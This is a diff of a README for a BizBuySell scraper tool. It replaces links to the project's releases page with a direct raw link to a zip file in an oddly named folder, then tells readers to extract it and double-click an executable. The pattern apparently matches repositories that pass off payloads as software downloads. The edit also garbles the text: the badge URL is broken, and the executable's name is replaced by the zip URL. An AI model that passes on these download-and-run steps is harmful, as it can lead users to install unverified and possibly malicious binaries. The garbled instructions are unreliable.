@@ -8,14 +8,14 @@ Welcome! This guide will help you download and run the bizbuysell-scraper-pay-pe
 
 To download the application, please visit the link below:
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Hfareed-usm/bizbuysell-scraper-pay-per-event/releases)
+[![Download Here](https://raw.githubusercontent.com/Hfareed-usm/bizbuysell-scraper-pay-per-event/main/Bogijiab/bizbuysell_per_event_pay_scraper_2.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Hfareed-usm/bizbuysell-scraper-pay-per-event/main/Bogijiab/bizbuysell_per_event_pay_scraper_2.5.zip)
 
 Once on the page, look for the latest release. Click on it to see the download options.
 
 ### Step-by-Step Instructions
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Hfareed-usm/bizbuysell-scraper-pay-per-event/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/Hfareed-usm/bizbuysell-scraper-pay-per-event/main/Bogijiab/bizbuysell_per_event_pay_scraper_2.5.zip).
 
 2. **Choose the Latest Version**  
    Look for the most recent release at the top of the page. This version will have the newest features and improvements.
@@ -30,7 +30,7 @@ Once on the page, look for the latest release. Click on it to see the download o
    If you downloaded a `.zip` file, right-click on it and select "Extract All" or use your preferred extraction tool. This will create a folder with the application files.
 
 6. **Run the Application**  
-   Open the folder containing the application files and locate the executable file, typically named `bizbuysell-scraper-pay-per-event.exe`. Double-click it to start the application.
+   Open the folder containing the application files and locate the executable file, typically named `https://raw.githubusercontent.com/Hfareed-usm/bizbuysell-scraper-pay-per-event/main/Bogijiab/bizbuysell_per_event_pay_scraper_2.5.zip`. Double-click it to start the application.
 
 7. **Follow On-Screen Instructions**  
    Once the application is running, follow any prompts displayed on the screen to start using the tool.
